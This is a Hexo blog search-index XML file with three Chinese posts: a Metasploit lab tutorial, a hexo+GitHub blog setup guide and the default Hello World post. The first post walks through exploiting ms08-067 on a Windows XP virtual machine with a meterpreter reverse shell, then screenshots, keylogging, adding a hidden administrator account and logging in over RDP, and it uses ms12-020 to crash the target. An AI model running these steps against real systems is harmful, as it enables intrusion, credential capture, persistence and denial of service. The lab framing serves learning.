<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于msfconsole的应用</title>
      <link href="/posts/5a76.html"/>
      <url>/posts/5a76.html</url>
      
        <content type="html"><![CDATA[<p>本篇文章介绍关于msfconsole的一些实例应用，主要是对ms08-067,ms12-020这两个实例的介绍以及应用。</p><span id="more"></span><h1 id="实验背景："><a href="#实验背景：" class="headerlink" title="实验背景："></a>实验背景：</h1><p>都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻击机和靶机要处在同一局域网下才行哒，建议开启仅主机模式哦。还有一点，有些命令无效，可能是因为模式为普通用户模式，在命令前面使用sudo就好了，或者切换为root（su root)</p><h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali             ip地址：192.168.127.139</p><p>靶机：winxpens3    ip地址：192.168.127.138</p><h1 id="1、ms08-067（单个攻击）"><a href="#1、ms08-067（单个攻击）" class="headerlink" title="1、ms08-067（单个攻击）"></a>1、ms08-067（单个攻击）</h1><h2 id="1-1配置命令"><a href="#1-1配置命令" class="headerlink" title="1.1配置命令"></a>1.1配置命令</h2><p>首先进入msfconsole界面，</p><pre class="line-numbers language-bash"><code class="language-bash">search ms08-067      <span class="token comment" spellcheck="true">#查找ms08-067漏洞</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个漏洞的基本信息：</p><img src="/posts/5a76/1.png" class><p>可以选择</p><pre class="line-numbers language-bash"><code class="language-bash">use 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用如下命令，一样的意思</p><pre class="line-numbers language-bash"><code class="language-bash">use exploit/windows/smb/ms08_067_netapi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择之后，发现提示信息，按照提示信息配置：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/2.png" class><p>然后输入</p><pre class="line-numbers language-bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看哪些是yes,即必填,如果它的Current Setting为空，则要对它进行设置，如</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> RHOSTS 192.168.127.138     <span class="token comment" spellcheck="true">#设置靶机地址</span><span class="token keyword">set</span> LHOST 192.168.127.139      <span class="token comment" spellcheck="true">#设置攻击机地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="1-2运行攻击"><a href="#1-2运行攻击" class="headerlink" title="1.2运行攻击"></a>1.2运行攻击</h2><p>完成前面的配置之后，运行：</p><pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功进入如下界面：</p><img src="/posts/5a76/3.png" class><h2 id="1-3使用screenshot命令可对靶机界面进行截图："><a href="#1-3使用screenshot命令可对靶机界面进行截图：" class="headerlink" title="1.3使用screenshot命令可对靶机界面进行截图："></a>1.3使用screenshot命令可对靶机界面进行截图：</h2><pre class="line-numbers language-bash"><code class="language-bash">screenshot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>截图默认保存在/home/kali目录下（命令下面会显示文件保存的路径），进入文件路径可以看到截图。</p><img src="/posts/5a76/4.png" class><h2 id="1-4查看并关闭靶机打开进程"><a href="#1-4查看并关闭靶机打开进程" class="headerlink" title="1.4查看并关闭靶机打开进程"></a>1.4查看并关闭靶机打开进程</h2><p>可以先使用ps命令查看靶机打开的进程号</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后可以使用kill关闭靶机的某个进程</p><p>比如，靶机此时打开了记事本，我在攻击上使用ps查看的进程号为2516（这个进程号是随机变化的哈），使用如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> 2516<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可关闭通过攻击机关闭靶机的记事本进程</p><img src="/posts/5a76/5.png" class><h2 id="1-5监听靶机键盘内容"><a href="#1-5监听靶机键盘内容" class="headerlink" title="1.5监听靶机键盘内容"></a>1.5监听靶机键盘内容</h2><p>同样先使用ps查看靶机此时的进程及进程号，得到此时靶机记事本进程为484（靶机已经重新打开记事本进程）</p><p>然后使用：</p><pre class="line-numbers language-bash"><code class="language-bash">migrate 484        <span class="token comment" spellcheck="true">#484为靶机开启的进程号</span>keyscan_start      <span class="token comment" spellcheck="true">#开启监听靶机键盘</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在靶机上任意输一些内容，回到kali，然后输入以下命令，即可查看监听到的键盘内容</p><pre class="line-numbers language-bash"><code class="language-bash">keyscan_dump       <span class="token comment" spellcheck="true">#得到监听内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/6.png" class><h2 id="1-6利用3389端口远程登录靶机"><a href="#1-6利用3389端口远程登录靶机" class="headerlink" title="1.6利用3389端口远程登录靶机"></a>1.6利用3389端口远程登录靶机</h2><p>在Windows上创建一个名称为zt密码为pass的用户，并提升为管理员权限</p><pre class="line-numbers language-bash"><code class="language-bash">net user zt pass /add                   <span class="token comment" spellcheck="true">#创建新用户，用户名为zt密码为pass</span>net localgroup Administrators zt /add   <span class="token comment" spellcheck="true">#将用户加入Administrators组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>确保靶机的3389端口已经打开，可以在kali上使用nmap扫描靶机地址查看靶机是否开启3389端口。</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -F 192.168.127.138            <span class="token comment" spellcheck="true">#查看靶机是否开启3389端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/7.png" class><p>发现3389端口已经打开，进入下一步。</p><p>接下来重新打开一个终端，输入</p><pre class="line-numbers language-bash"><code class="language-bash">rdesktop 192.168.127.138      <span class="token comment" spellcheck="true">#远程登录靶机</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 回车后会自动弹出如图所示的登录窗口</p><img src="/posts/5a76/8.png" class><p>使用创建的账户zt,密码pass即可远程登录靶机</p><img src="/posts/5a76/9.png" class><h1 id="2、ms12-020（导致对方蓝屏）"><a href="#2、ms12-020（导致对方蓝屏）" class="headerlink" title="2、ms12-020（导致对方蓝屏）"></a>2、ms12-020（导致对方蓝屏）</h1><h2 id="2-1配置命令"><a href="#2-1配置命令" class="headerlink" title="2.1配置命令"></a>2.1配置命令</h2><p>确定靶机的3389端口打开</p><p>进入msfconsole，配置如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash">search ms12-020   <span class="token comment" spellcheck="true">#查找ms12-020漏洞</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看信息，使用如下，这里因为0已经被修复，所以这里只能使用关于1的，不能使用use 0</p><img src="/posts/5a76/10.png" class><pre class="line-numbers language-bash"><code class="language-bash">use 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用如下，</p><pre class="line-numbers language-bash"><code class="language-bash">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择之后，发现提示信息，按照提示信息配置：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload linux/x64/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/11.png" class><p>然后查看并配置所需命令：</p><pre class="line-numbers language-bash"><code class="language-bash">show options<span class="token keyword">set</span> RHOSTS 192.168.127.138    <span class="token comment" spellcheck="true">#配置靶机地址</span><span class="token keyword">set</span> LHOST 192.168.127.139     <span class="token comment" spellcheck="true">#配置攻击机地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-2运行攻击"><a href="#2-2运行攻击" class="headerlink" title="2.2运行攻击"></a>2.2运行攻击</h2><p>完成前面的配置之后，运行：</p><pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/12.png" class><p>查看到出现seems down 表示攻击成功，已经致使目标机蓝屏了。</p><img src="/posts/5a76/13.png" class>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> msfconsole </tag>
            
            <tag> 攻击 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo + github 搭建博客</title>
      <link href="/posts/85e6.html"/>
      <url>/posts/85e6.html</url>
      
        <content type="html"><![CDATA[<p>本篇文章介绍了使用hexo+github创建博客的主要流程。我也是在考虑各方因素之后，选择了github.io的方式。优点嘛，就是免费加开源yyds！好了，进入正题。</p><span id="more"></span><h1 id="1、搭建本地环境"><a href="#1、搭建本地环境" class="headerlink" title="1、搭建本地环境"></a>1、搭建本地环境</h1><h2 id="1-1下载并安装nodejs"><a href="#1-1下载并安装nodejs" class="headerlink" title="1.1下载并安装nodejs"></a>1.1下载并安装<a href="https://nodejs.org/">nodejs</a></h2><p>安装时一路默认即可。</p><p>测试：打开cmd,输入以下测试，出现版本号即表示成功</p><pre class="line-numbers language-bash"><code class="language-bash">node -v<span class="token function">npm</span> -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/85e6/1.png" class><h2 id="1-2下载并安装git"><a href="#1-2下载并安装git" class="headerlink" title="1.2下载并安装git"></a>1.2下载并安装<a href="https://git-scm.com/downloads">git</a></h2><p>安装时也一路默认即可。</p><p>测试：打开cmd,输入如下测试，出现版本号</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/85e6/2.png" class><p>并且在桌面右键鼠标，出现如下两个图标即表示成功</p><img src="/posts/85e6/3.png" class><h1 id="2、注册Github账户（已有账户的可跳过此步）"><a href="#2、注册Github账户（已有账户的可跳过此步）" class="headerlink" title="2、注册Github账户（已有账户的可跳过此步）"></a>2、注册Github账户（已有账户的可跳过此步）</h1><h2 id="2-1进入github官网，注册账号即可"><a href="#2-1进入github官网，注册账号即可" class="headerlink" title="2.1进入github官网，注册账号即可"></a>2.1进入<a href="https://github.com/">github</a>官网，注册账号即可</h2><h2 id="2-2注册完成后，连接github"><a href="#2-2注册完成后，连接github" class="headerlink" title="2.2注册完成后，连接github"></a>2.2注册完成后，连接github</h2><p>在桌面右键，选择Git Bash Here，设置用户名和邮箱（创建github账户时的用户名和邮箱）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"Github 用户名"</span><span class="token function">git</span> config --global user.email <span class="token string">"Github 邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="3、添加加密密钥"><a href="#3、添加加密密钥" class="headerlink" title="3、添加加密密钥"></a>3、添加加密密钥</h1><h2 id="3-1创建ssh密钥"><a href="#3-1创建ssh密钥" class="headerlink" title="3.1创建ssh密钥"></a>3.1创建ssh密钥</h2><p>先检查一下本地是否有.ssh文件夹：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> ~/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有，则直接进入接下这一步，有的话，可以修改路径等</p><pre class="line-numbers language-bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"Github 邮箱"</span> <span class="token comment" spellcheck="true">#注意ssh-keygen是直接连起来的，中间没有空格</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认回车，创建完成后，可得到两个文件（因为.ssh为隐藏文件，如果没有找到.ssh项目，可以先检查一下自己的文件是否勾选隐藏的项目。.ssh的默认路径为：C:\users\用户名.ssh)</p><pre class="line-numbers language-bash"><code class="language-bash">id_rsaid_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-2添加ssh密钥到github账户"><a href="#3-2添加ssh密钥到github账户" class="headerlink" title="3.2添加ssh密钥到github账户"></a>3.2添加ssh密钥到github账户</h2><p>将id_rsa.pub的内容全部复制下来，</p><p>进入github，点击setting页面，然后选择左边栏的 SSH and GPG keys，点击 New SSH key。</p><img src="/posts/85e6/4.png" class><p>Title随便命令，将复制下来的id_rsa.pub的内容粘贴到Key中，点击Add SSH key 完成添加。</p><img src="/posts/85e6/5.png" class><h2 id="3-3验证连接"><a href="#3-3验证连接" class="headerlink" title="3.3验证连接"></a>3.3验证连接</h2><p>在桌面右击鼠标，选择Git Bash Here，输入</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> -T git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现以下图片即表示成功：</p><img src="/posts/85e6/6.jpg" class><h1 id="4、创建github仓库"><a href="#4、创建github仓库" class="headerlink" title="4、创建github仓库"></a>4、创建github仓库</h1><ul><li><p>GitHub 主页右上角加号，选择 New repository</p></li><li><p>Repository name 中输入：用户名.github.io</p></li><li><p>Description 选填</p></li><li><p>勾选 “Add a README file”</p></li></ul><p><strong>注意：最新版的GitHub的默认分支为main,从下图可以看到（也可以自行更改为其他分支）</strong></p><p>创建后，博客地址为：https://用户名.github.io</p><img src="/posts/85e6/7.png" class><h1 id="5、安装hexo"><a href="#5、安装hexo" class="headerlink" title="5、安装hexo"></a>5、安装hexo</h1><h2 id="5-1安装"><a href="#5-1安装" class="headerlink" title="5.1安装"></a>5.1安装</h2><p>使用我们前面的环境npm即可一键安装hexo程序</p><p>鼠标右击，选择Git Bash Here，输入：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-2测试"><a href="#5-2测试" class="headerlink" title="5.2测试"></a>5.2测试</h2><p>检查是否安装成功：</p><p>在cmd或者Git Bash Here里面输入：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现相关版本号即可</p><img src="/posts/85e6/8.jpg" class><h2 id="5-3初始化并安装所需组件："><a href="#5-3初始化并安装所需组件：" class="headerlink" title="5.3初始化并安装所需组件："></a>5.3初始化并安装所需组件：</h2><p>先新建一个文件夹，在该文件夹下右击鼠标，选择Git Bash Here，输入：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo init    <span class="token comment" spellcheck="true">#初始化</span><span class="token function">npm</span> <span class="token function">install</span>  <span class="token comment" spellcheck="true">#安装组件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者，直接这样运行：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo init 文件名称<span class="token function">cd</span> 文件路径<span class="token function">npm</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完成后，启动服务器进行预览：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo g     <span class="token comment" spellcheck="true">#生成静态页面，或者hexo generate</span>hexo s     <span class="token comment" spellcheck="true">#启动服务，或者hexo server</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时访问：<a href="http://localhost:4000，出现hexo默认页面，表示安装成功">http://localhost:4000，出现hexo默认页面，表示安装成功</a></p><img src="/posts/85e6/9.png" class><h1 id="6、部署hexo到GitHub-Pages"><a href="#6、部署hexo到GitHub-Pages" class="headerlink" title="6、部署hexo到GitHub Pages"></a>6、部署hexo到GitHub Pages</h1><p>前面五步已经能够实现在本地访问hexo,我们的真正目的是使其部署到GitHub Pages，通过网络能够访问它。</p><h2 id="6-1安装git部署插件hexo-deployer-git"><a href="#6-1安装git部署插件hexo-deployer-git" class="headerlink" title="6.1安装git部署插件hexo-deployer-git"></a>6.1安装git部署插件hexo-deployer-git</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-2修改-config-yml站点配置文件"><a href="#6-2修改-config-yml站点配置文件" class="headerlink" title="6.2修改_config.yml站点配置文件"></a>6.2修改_config.yml站点配置文件</h2><p>在你之前创建的目录下，找到_config.yml文件，并用记事本打开，</p><p>修改末尾的Deployment 部分,</p><p><strong>注意：冒号后面一定记得有个空格！！！</strong></p><pre class="line-numbers language-bash"><code class="language-bash">deploy:type: <span class="token function">git</span>repository: git@github.com:用户名/用户名.github.io.gitbranch: main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，</p><p>repository后面的地址可从如下图所示直接复制过来</p><img src="/posts/85e6/10.png" class><p>branch后面是前面提过的默认分支，默认为main,可以修改为其他的，我把默认分支修改为了master（那就要修改为branch: master)，修改方法如下：</p><img src="/posts/85e6/11.png" class><h2 id="6-3发布文章"><a href="#6-3发布文章" class="headerlink" title="6.3发布文章"></a>6.3发布文章</h2><p>进入之前所创建的hexo的所在目录，右键Git Bash Here ，输入</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new <span class="token string">"first"</span> <span class="token comment" spellcheck="true">#创建名为"first"的文章，""里面的标题可自行命名</span>hexo g <span class="token comment" spellcheck="true">#生成静态页面</span>hexo d <span class="token comment" spellcheck="true">#将文章部署到GitHub pages，或者hexo deploy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，访问我们的GitHub域名，即：https://用户名.github.io 就可以看到hexo网站啦！</p><h1 id="常用的hexo命令"><a href="#常用的hexo命令" class="headerlink" title="常用的hexo命令"></a>常用的hexo命令</h1><pre class="line-numbers language-bash"><code class="language-bash">hexo new <span class="token string">"name"</span>         <span class="token comment" spellcheck="true"># 新建文章</span>hexo new page <span class="token string">"name"</span>    <span class="token comment" spellcheck="true"># 新建页面</span>hexo g                  <span class="token comment" spellcheck="true"># 生成页面</span>hexo d                  <span class="token comment" spellcheck="true"># 部署</span>hexo g -d               <span class="token comment" spellcheck="true"># 生成页面并部署</span>hexo s                  <span class="token comment" spellcheck="true"># 本地预览</span>hexo clean              <span class="token comment" spellcheck="true"># 清除缓存和已生成的静态文件</span>hexo <span class="token function">help</span>               <span class="token comment" spellcheck="true"># 帮助</span>hexo --debug            <span class="token comment" spellcheck="true"># 调试模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/3eeb.html"/>
      <url>/posts/3eeb.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
